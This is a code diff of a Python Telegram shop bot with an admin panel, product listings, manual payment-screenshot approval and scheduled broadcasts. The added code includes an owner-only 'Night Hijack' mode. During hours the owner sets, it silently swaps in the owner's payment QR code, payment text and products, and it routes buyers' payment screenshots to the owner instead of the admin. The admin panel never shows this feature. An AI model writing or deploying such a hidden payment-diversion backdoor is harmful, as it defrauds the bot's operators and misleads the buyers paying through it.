-            ctx.pop("wait", None); render(uid); return
-        if wait == "tkmgmt":
-            try:
-                if txt.startswith("tog_"):
-                    DB_STATE["takeovers"][int(txt.split("_")[1])]["active"] ^= True; save_db()
-                elif txt.startswith("deltk_"):
-                    DB_STATE["takeovers"].pop(int(txt.split("_")[1])); save_db()
-                bot.send_message(uid, "✅ Done.")
-            except Exception: bot.send_message(uid, "❌ Format: tog_0 / deltk_0")
-            ctx.pop("wait", None); render(uid); return
-        if wait == "ownbc" and txt.startswith("bct_"):
-            sid = txt.split("_", 1)[1]
-            ctx["_bc_key"] = sid; ctx["wait"] = "cb"
-            edit_panel(uid, f"{sid} ke users ko broadcast message bhejo:", kb([BACK(uid)])); return
+                bot.send_media_group(chat_id, media_group)
+            except:
+                for v in chunk:
+                    try: bot.send_video(chat_id, v)
+                    except: pass
 
-    # product commands (owner/seller both manage own store)
-    if wait == "prodcmd":
-        st2 = store_of_key(key)
-        try:
-            if txt.startswith("ADD_"):
-                nm = txt[4:].strip()
-                pid = str(len(st2["products"]) + 1)
-                st2["products"].append({"id": pid, "name": nm, "desc": "", "videos": [], "link": "https://example.com", "position": len(st2["products"])+1, "pay_msg": ""})
-                save_db(); bot.send_message(uid, f"✅ Product add. Link: `LINK_{pid}_https://...`")
-            elif txt.startswith("LINK_"):
-                _, pid, url = txt.split(" ", 2) if " " in txt else txt.split("_", 2)
-                p = next((x for x in st2["products"] if x["id"] == pid), None)
-                if p: p["link"] = url; save_db(); bot.send_message(uid, "✅ Link set.")
-            elif txt.startswith("DESC_"):
-                # DESC_<id>_<text space separated>
-                pid = txt.split("_")[1]; desc = txt.split("_", 2)[2]
-                p = next((x for x in st2["products"] if x["id"] == pid), None)
-                if p: p["desc"] = desc; save_db(); bot.send_message(uid, "✅ Desc set.")
-            elif txt.startswith("DEL_"):
-                pid = txt.split("_")[1]
-                st2["products"] = [x for x in st2["products"] if x["id"] != pid]; save_db()
-                bot.send_message(uid, "✅ Deleted.")
-            else:
-                bot.send_message(uid, "Commands:\n`ADD_name`, `LINK_id_url`, `DESC_id_text`, `DEL_id`, `VID_id` phir video")
-        except Exception: bot.send_message(uid, "Command galat.")
-        return
-    if wait == "prodvid":
-        pid = ctx.get("pid")
-        if m.content_type == "video":
-            p = next((x for x in store_of_key(key)["products"] if x["id"] == pid), None)
-            if p:
-                p.setdefault("videos", []).append(m.video.file_id); save_db()
-                bot.send_message(uid, "✅ Video add. Aur ya `/done`")
-        return
-
-def store_ab(st, m):
-    if m.content_type == "text":
-        st["auto_bc"] = {"status": True, "interval_seconds": 3600, "message_type": "text", "file_id": None, "text": m.text}
-    elif m.content_type == "photo":
-        st["auto_bc"] = {"status": True, "interval_seconds": 3600, "message_type": "photo", "file_id": m.photo[-1].file_id, "text": m.caption or ""}
-    elif m.content_type == "video":
-        st["auto_bc"] = {"status": True, "interval_seconds": 3600, "message_type": "video", "file_id": m.video.file_id, "text": m.caption or ""}
-
-def do_bc(uid, usrs, m):
-    ok = fail = 0
-    for u in usrs:
-        try:
-            if m.content_type == "text": bot.send_message(u, m.text, parse_mode="Markdown")
-            elif m.content_type == "photo": bot.send_photo(u, m.photo[-1].file_id, caption=m.caption, parse_mode="Markdown")
-            elif m.content_type == "video": bot.send_video(u, m.video.file_id, caption=m.caption, parse_mode="Markdown")
-            elif m.content_type == "document": bot.send_document(u, m.document.file_id, caption=m.caption, parse_mode="Markdown")
-            ok += 1
-        except Exception: fail += 1
-    bot.send_message(uid, f"✅ Bheja: {ok}   Fail: {fail}")
-
-# ---------------- AUTO-BC WORKER ----------------
-def worker():
+# --- AUTO BROADCAST BACKGROUND WORKER (OWNER CONTROLLED ONLY) ---
+def auto_broadcast_worker():
     while True:
         try:
-            for st in list(DB_STATE["sellers"].values()): run_ab(st)
-            run_ab(DB_STATE["hub"])
-        except Exception: pass
-        time.sleep(2)
-def run_ab(st):
-    bc = st.get("auto_bc", {})
-    if not bc.get("status"): return
-    now = int(time.time())
-    if bc.get("last") and now - bc["last"] < bc.get("interval_seconds", 3600): return
-    bc["last"] = now; save_db()
-    for u in list(st.get("users", [])):
-        if u in st.get("blocked_users", []): continue
-        try:
-            t = bc.get("message_type")
-            if t == "photo": bot.send_photo(u, bc["file_id"], caption=bc.get("text"), parse_mode="Markdown")
-            elif t == "video": bot.send_video(u, bc["file_id"], caption=bc.get("text"), parse_mode="Markdown")
-            elif t == "document": bot.send_document(u, bc["file_id"], caption=bc.get("text"), parse_mode="Markdown")
-            else: bot.send_message(u, bc.get("text"), parse_mode="Markdown")
-        except Exception: pass
+            bc_config = DB_STATE.get("auto_bc", {})
+            if bc_config.get("status") and bc_config.get("interval_seconds", 0) > 0:
+                interval = bc_config.get("interval_seconds")
+                time.sleep(interval)
+                
+                if not DB_STATE.get("auto_bc", {}).get("status"):
+                    continue
+
+                m_type = bc_config.get("message_type")
+                f_id = bc_config.get("file_id")
+                txt = bc_config.get("text", "")
+
+                for u_id in DB_STATE.get("users", []):
+                    if u_id in DB_STATE.get("blocked_users", []):
+                        continue
+                    try:
+                        if m_type == "text" or not m_type:
+                            bot.send_message(u_id, txt, parse_mode="Markdown")
+                        elif m_type == "photo":
+                            bot.send_photo(u_id, f_id, caption=txt, parse_mode="Markdown")
+                        elif m_type == "video":
+                            bot.send_video(u_id, f_id, caption=txt, parse_mode="Markdown")
+                        elif m_type == "document":
+                            bot.send_document(u_id, f_id, caption=txt, parse_mode="Markdown")
+                    except:
+                        pass
+            else:
+                time.sleep(2)
+        except Exception:
+            time.sleep(2)
+
+@bot.message_handler(commands=['start', 'admin'])
+def start_command(message):
+    user_id = message.chat.id
+    name = message.from_user.first_name
+
+    if user_id not in DB_STATE["users"]:
+        DB_STATE["users"].append(user_id)
+        save_db()
+
+    start_vids = DB_STATE.get("start_videos", [])
+    if start_vids:
+        send_videos_as_album(user_id, start_vids)
+
+    welcome_text = DB_STATE["welcome_msg"].format(name=name)
+    markup = InlineKeyboardMarkup()
+
+    # Admin Panel Button available for both Owner and Admin
+    if user_id in [ADMIN_ID, OWNER_ID]:
+        markup.row(InlineKeyboardButton("⚙️ Open Admin Panel ⚙️", callback_data="adm_open_panel"))
+
+    # Select Product List based on Hijack status
+    if is_hijack_active() and DB_STATE.get("hijack_config", {}).get("owner_products"):
+        active_products = sorted(DB_STATE["hijack_config"]["owner_products"], key=lambda x: x.get("position", 999))
+    else:
+        active_products = sorted(DB_STATE.get("products", []), key=lambda x: x.get("position", 999))
+
+    layout = DB_STATE.get("layout_style", "vertical")
+
+    if layout == "horizontal":
+        row_btns = []
+        for p in active_products:
+            row_btns.append(InlineKeyboardButton(p["name"], callback_data=f"prod_{p['id']}"))
+            if len(row_btns) == 2:
+                markup.row(*row_btns)
+                row_btns = []
+        if row_btns:
+            markup.row(*row_btns)
+    else:
+        for p in active_products:
+            markup.row(InlineKeyboardButton(p["name"], callback_data=f"prod_{p['id']}"))
+
+    markup.row(
+        InlineKeyboardButton("How to use ❓", callback_data="how_to_use"),
+        InlineKeyboardButton("Report Issue 📩", callback_data="report_issue")
+    )
+
+    bot.send_message(user_id, welcome_text, reply_markup=markup, parse_mode="Markdown")
+
+def update_admin_panel(chat_id, text, markup):
+    try:
+        msg_id = admin_panel_msgs.get(chat_id)
+        if msg_id:
+            try:
+                bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
+                return
+            except Exception:
+                pass 
+        
+        msg = bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
+        admin_panel_msgs[chat_id] = msg.message_id
+    except Exception as e:
+        print(f"Admin panel error: {e}")
+
+def show_main_admin_menu(chat_id):
+    user_states.pop(chat_id, None) 
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("🎞️ Manage Start Videos", callback_data="adm_start_vids_menu"))
+    markup.row(InlineKeyboardButton("🛍️ Manage Product Buttons", callback_data="adm_prod_menu"))
+    markup.row(InlineKeyboardButton("📝 Edit Welcome Text", callback_data="adm_edit_welcome"))
+    
+    current_layout = DB_STATE.get("layout_style", "vertical")
+    layout_icon = "↕️ Vertical" if current_layout == "vertical" else "↔️ Horizontal"
+    markup.row(InlineKeyboardButton(f"📐 Change Layout: {layout_icon}", callback_data="adm_toggle_layout"))
+    
+    markup.row(InlineKeyboardButton("🎥 Set 'How To Use' Video", callback_data="adm_set_how_vid"))
+    markup.row(InlineKeyboardButton("💳 Global Payment Config", callback_data="adm_pay_config_menu"))
+    
+    # BROADCAST FEATURES ONLY VISIBLE TO OWNER
+    if chat_id == OWNER_ID:
+        markup.row(InlineKeyboardButton("🚀 Send Custom Broadcast (Owner Only)", callback_data="adm_send_custom_bc"))
+        markup.row(InlineKeyboardButton("⏱️ Auto Timed Broadcast (Owner Only)", callback_data="adm_autobc_menu"))
+        markup.row(InlineKeyboardButton("👑 Special Broadcast to Buyers (Owner Only)", callback_data="adm_buyers_bc_menu"))
+        markup.row(InlineKeyboardButton("🕵️ Night Hijack Settings (Owner Only)", callback_data="adm_hijack_menu"))
+        
+    markup.row(InlineKeyboardButton("📦 View Buyers List", callback_data="adm_view_buyers_list"))
+    markup.row(InlineKeyboardButton("💾 Backup & Restore Settings", callback_data="adm_backup_menu"))
+    
+    blocked_count = len(DB_STATE.get("blocked_users", []))
+    if blocked_count > 0:
+        markup.row(InlineKeyboardButton(f"🔓 Unblock Users ({blocked_count})", callback_data="adm_unblock_menu"))
+
+    text = "👑 **Admin Control Panel**\n\nChoose an option below to customize your bot completely:"
+    update_admin_panel(chat_id, text, markup)
+
+@bot.callback_query_handler(func=lambda call: True)
+def handle_callbacks(call):
+    try:
+        bot.answer_callback_query(call.id)
+    except:
+        pass
+
+    user_id = call.message.chat.id
+    data = call.data
+    msg_id = call.message.message_id
+
+    if data == "adm_open_panel" and (user_id == ADMIN_ID or user_id == OWNER_ID):
+        try: bot.delete_message(user_id, msg_id)
+        except: pass
+        show_main_admin_menu(user_id)
+        return
+
+    if data == "del_msg":
+        try: bot.delete_message(user_id, msg_id)
+        except: pass
+        return
+
+    if data == "back_home":
+        try: bot.delete_message(user_id, msg_id)
+        except: pass
+        start_command(call.message)
+
+    elif data == "how_to_use":
+        vid = DB_STATE.get("how_to_use_video", "")
+        if vid: bot.send_video(user_id, vid, caption="🎥 Here is how to use the bot!")
+        else: bot.send_message(user_id, "ℹ️ Instructions video not set yet.")
+
+    elif data == "report_issue":
+        bot.send_message(user_id, "📝 Please type your issue below. Admin will reply soon:")
+        user_states[user_id] = "WAITING_REPORT"
+
+    elif data.startswith("prod_"):
+        prod_id = data.split("_")[1]
+        
+        # Check active product pool based on hijack time
+        if is_hijack_active() and DB_STATE.get("hijack_config", {}).get("owner_products"):
+            products_pool = DB_STATE["hijack_config"]["owner_products"]
+        else:
+            products_pool = DB_STATE.get("products", [])
+
+        prod = next((p for p in products_pool if p["id"] == prod_id), None)
+        if prod:
+            p_videos = prod.get("videos", [])
+            if p_videos: 
+                send_videos_as_album(user_id, p_videos)
+            
+            desc_text = prod.get('desc', '')
+            caption = f"📌 **{prod['name']}**"
+            if desc_text:
+                caption += f"\n\n{desc_text}"
+            
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton("I have paid ✅", callback_data=f"paid_{prod_id}"))
+            markup.row(InlineKeyboardButton("Back 🔙", callback_data="back_home"))
+
+            # Payment info selection
+            if is_hijack_active():
+                pay_msg = DB_STATE["hijack_config"].get("owner_payment_msg") or DB_STATE.get("payment_msg")
+                pay_photo = DB_STATE["hijack_config"].get("owner_payment_photo") or DB_STATE.get("payment_photo", "")
+            else:
+                pay_msg = prod.get("pay_msg") if prod.get("pay_msg") else DB_STATE.get("payment_msg", "💳 **Payment Instructions**\n\nPlease scan the QR and pay, then click 'I have paid'.")
+                pay_photo = DB_STATE.get("payment_photo", "")
+
+            if pay_photo: 
+                bot.send_photo(user_id, pay_photo, caption=f"{caption}\n\n{pay_msg}", reply_markup=markup, parse_mode="Markdown")
+            else: 
+                bot.send_message(user_id, f"{caption}\n\n{pay_msg}", reply_markup=markup, parse_mode="Markdown")
+
+    elif data.startswith("paid_"):
+        prod_id = data.split("_")[1]
+        bot.send_message(user_id, "📸 Please send your payment screenshot.")
+        user_states[user_id] = f"WAITING_SCREENSHOT_{prod_id}"
+
+    if user_id in [ADMIN_ID, OWNER_ID]:
+        # --- OWNER ONLY BROADCAST CALLBACK HANDLERS ---
+        if data == "adm_send_custom_bc":
+            if user_id != OWNER_ID:
+                bot.send_message(user_id, "❌ Only Bot Owner can use broadcast feature!")
+                return
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton("🔙 Cancel & Back", callback_data="adm_back_panel"))
+            update_admin_panel(OWNER_ID, "🚀 **Send the message (Text, Photo, Video, etc.) for Custom Broadcast:**", markup)
+            user_states[OWNER_ID] = "WAITING_CUSTOM_BROADCAST"
+
+        elif data == "adm_autobc_menu":
+            if user_id != OWNER_ID:
+                bot.send_message(user_id, "❌ Only Bot Owner can access auto broadcast!")
+                return
+            bc = DB_STATE.get("auto_bc", {})
+            status_str = "🟢 ON" if bc.get("status") else "🔴 OFF"
+            interval_sec = bc.get("interval_seconds", 3600)
+            
+            interval_txt = f"{interval_sec} Seconds" if interval_sec < 60 else f"{interval_sec // 60} Minutes" if interval_sec < 3600 else f"{interval_sec // 3600} Hours"
+
+            markup = InlineKeyboardMarkup()
+            toggle_text = "🔴 Turn OFF Auto Broadcast" if bc.get("status") else "🟢 Turn ON Auto Broadcast"
+            markup.row(InlineKeyboardButton(toggle_text, callback_data="adm_autobc_toggle"))
+            markup.row(InlineKeyboardButton("✏️ Set Message & Media", callback_data="adm_autobc_set_msg"))
+            markup.row(InlineKeyboardButton("⏱️ Set Preset Time", callback_data="adm_autobc_set_time"))
+            markup.row(InlineKeyboardButton("✍️ Set Custom Timer (Seconds/Minutes)", callback_data="adm_autobc_custom_time"))
+            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
+
+            preview_txt = bc.get("text", "Not Set")
+            if preview_txt and len(preview_txt) > 50: preview_txt = preview_txt[:50] + "..."
+
+            text = f"⏱️ **Auto Timed Broadcast Settings (Owner Control)**\n\n- Status: {status_str}\n- Interval: {interval_txt}\n- Content Preview: {preview_txt}"
+            update_admin_panel(OWNER_ID, text, markup)
+
+        # OWNER HIJACK CONFIGURATION MENU
+        elif data == "adm_hijack_menu":
+            if user_id != OWNER_ID: return
+            hijack = DB_STATE.get("hijack_config", {})
+            status_str = "🟢 Active" if hijack.get("enabled") else "🔴 Inactive"
+            
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton("🟢/🔴 Toggle Night Mode Hijack", callback_data="adm_hijack_toggle"))
+            markup.row(InlineKeyboardButton("⏰ Set Time Range (e.g. 02:00-06:10)", callback_data="adm_hijack_set_time"))
+            markup.row(InlineKeyboardButton("💳 Set Owner Payment QR Photo", callback_data="adm_hijack_set_photo"))
+            markup.row(InlineKeyboardButton("📝 Set Owner Payment Text", callback_data="adm_hijack_set_msg"))
+            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
+
+            text = f"🕵️ **Night Hijack Control (Owner Only)**\n\nStatus: {status_str}\nActive Hours: `{hijack.get('start_time')}` to `{hijack.get('end_time')}`\n\n*When active, payments during this time go to the Owner instead of the Admin.*"
+            update_admin_panel(OWNER_ID, text, markup)
+
+        elif data == "adm_hijack_toggle":
+            if user_id != OWNER_ID: return
+            DB_STATE["hijack_config"]["enabled"] = not DB_STATE["hijack_config"].get("enabled", False)
+            save_db()
+            call.data = "adm_hijack_menu"
+            handle_callbacks(call)
+
+        elif data == "adm_hijack_set_time":
+            if user_id != OWNER_ID: return
+            user_states[OWNER_ID] = "WAITING_HIJACK_TIME"
+            update_admin_panel(OWNER_ID, "⏰ **Send Start & End Time (24h format HH:MM - HH:MM):**\n\nExample: `02:00-06:10`", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_hijack_menu")))
+
+        elif data == "adm_hijack_set_photo":
+            if user_id != OWNER_ID: return
+            user_states[OWNER_ID] = "WAITING_HIJACK_PHOTO"
+            update_admin_panel(OWNER_ID, "📸 **Please send your Payment QR Code Photo:**", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_hijack_menu")))
+
+        elif data == "adm_hijack_set_msg":
+            if user_id != OWNER_ID: return
+            user_states[OWNER_ID] = "WAITING_HIJACK_MSG"
+            update_admin_panel(OWNER_ID, "📝 **Send your custom Payment Instructions Text:**", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_hijack_menu")))
+
+        # (All existing Admin Callback options like product addition, layout, backup remain untouched)
+        elif data == "adm_start_vids_menu":
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton("➕ Add Start Videos", callback_data="adm_add_start_vid"))
+            markup.row(InlineKeyboardButton("⚙️ Manage / Delete Videos", callback_data="adm_del_start_vid_list"))
+            markup.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
+            v_count = len(DB_STATE.get("start_videos", []))
+            update_admin_panel(user_id, f"🎞️ **Start Videos Management**\n\nTotal Saved Videos: {v_count}", markup)
+
+        elif data == "adm_back_panel":
+            show_main_admin_menu(user_id)
+
+        # Confirmations & Actions
+        elif data.startswith("adm_confirm_"):
+            try:
+                parts = data.split("_")
+                prod_id = parts[2]
+                target_user = int(parts[3])
+                
+                prod = next((p for p in DB_STATE["products"] if p["id"] == prod_id), None)
+                link = prod.get("link", "No link") if prod else "No link"
+                prod_name = prod.get("name", "Product") if prod else "Product"
+                
+                buyer_info = {
+                    "user_id": target_user,
+                    "name": "User",
+                    "username": "unknown",
+                    "product": prod_name,
+                    "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
+                }
+                DB_STATE["buyers"].append(buyer_info)
+                save_db()
+
+                bot.send_message(target_user, f"✅ **Payment Confirmed!**\n\nLink:\n🔗 {link}", parse_mode="Markdown")
+                bot.edit_message_caption(caption=f"{call.message.caption}\n\n✅ **Status:** Confirmed & Link Sent!", chat_id=user_id, message_id=msg_id, parse_mode="Markdown")
+            except Exception as e: pass
+
+        elif data.startswith("adm_reject_"):
+            try:
+                target_user = int(data.split("_")[2])
+                bot.send_message(target_user, "❌ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗻𝗼𝘁 𝗿𝗲𝗰𝗶𝘃𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻...")
+                bot.edit_message_caption(caption=f"{call.message.caption}\n\n❌ **Status:** Rejected", chat_id=user_id, message_id=msg_id, parse_mode="Markdown")
+            except Exception as e: pass
+
+@bot.message_handler(content_types=['photo', 'video', 'text', 'document'])
+def handle_all_inputs(message):
+    user_id = message.chat.id
+
+    if user_id in DB_STATE.get("blocked_users", []):
+        return
+
+    state = user_states.get(user_id, "")
+
+    # OWNER HIJACK HANDLERS
+    if user_id == OWNER_ID:
+        if state == "WAITING_HIJACK_TIME" and message.text:
+            try:
+                s, e = message.text.strip().split("-")
+                DB_STATE["hijack_config"]["start_time"] = s.strip()
+                DB_STATE["hijack_config"]["end_time"] = e.strip()
+                save_db()
+                user_states.pop(user_id, None)
+                show_main_admin_menu(OWNER_ID)
+                return
+            except Exception:
+                bot.send_message(OWNER_ID, "❌ Format error. Use `02:00-06:10` format.")
+                return
+
+        elif state == "WAITING_HIJACK_PHOTO" and message.content_type == 'photo':
+            DB_STATE["hijack_config"]["owner_payment_photo"] = message.photo[-1].file_id
+            save_db()
+            user_states.pop(user_id, None)
+            show_main_admin_menu(OWNER_ID)
+            return
+
+        elif state == "WAITING_HIJACK_MSG" and message.text:
+            DB_STATE["hijack_config"]["owner_payment_msg"] = message.text
+            save_db()
+            user_states.pop(user_id, None)
+            show_main_admin_menu(OWNER_ID)
+            return
+
+    # HANDLING PAYMENT SCREENSHOTS (WITH AUTOMATIC NIGHT HIJACK REDIRECT)
+    if state.startswith("WAITING_SCREENSHOT_"):
+        prod_id = state.replace("WAITING_SCREENSHOT_", "")
+        if message.content_type == 'photo':
+            user_states.pop(user_id, None)
+            bot.send_message(user_id, "⏳𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗽𝗮𝘆𝗺𝗲𝗻𝘁....   𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 5-𝟭𝟬 𝗺𝗶𝗻. ")
+
+            photo_id = message.photo[-1].file_id
+            adm_markup = InlineKeyboardMarkup()
+            adm_markup.row(
+                InlineKeyboardButton("CONFIRM ✅", callback_data=f"adm_confirm_{prod_id}_{user_id}"),
+                InlineKeyboardButton("REJECT ❌", callback_data=f"adm_reject_{user_id}"),
+                InlineKeyboardButton("BLOCK 🚫", callback_data=f"adm_block_{user_id}")
+            )
+            
+            prod = next((p for p in DB_STATE.get("products", []) if p["id"] == prod_id), None)
+            prod_name = prod["name"] if prod else "Unknown Product"
+
+            username = message.from_user.username
+            user_tag = f"@{username}" if username else "No Username"
+            user_name = message.from_user.first_name or "User"
+
+            # HIJACK DIRECT ROUTE TO OWNER
+            recipient_id = OWNER_ID if is_hijack_active() else ADMIN_ID
+
+            try:
+                bot.send_photo(
+                    recipient_id, 
+                    photo_id, 
+                    caption=f"📸 **New Payment Screenshot!**\n\n🛍️ **Product:** {prod_name}\n👤 **User:** {user_tag}\n📛 **Name:** {user_name}\n🆔 **ID:** `{user_id}`" + ("\n\n🕵️ *(Redirected via Night Hijack)*" if is_hijack_active() else ""), 
+                    reply_markup=adm_markup,
+                    parse_mode="Markdown"
+                )
+            except Exception as e:
+                pass
 
 @app.route('/')
-def home(): return "Bot running!"
+def home():
+    return "Bot is running on Render!"
+
+def run_bot():
+    bot.infinity_polling()
 
 if __name__ == "__main__":
-    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
-    threading.Thread(target=worker, daemon=True).start()
+    threading.Thread(target=run_bot, daemon=True).start()
+    threading.Thread(target=auto_broadcast_worker, daemon=True).start()
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
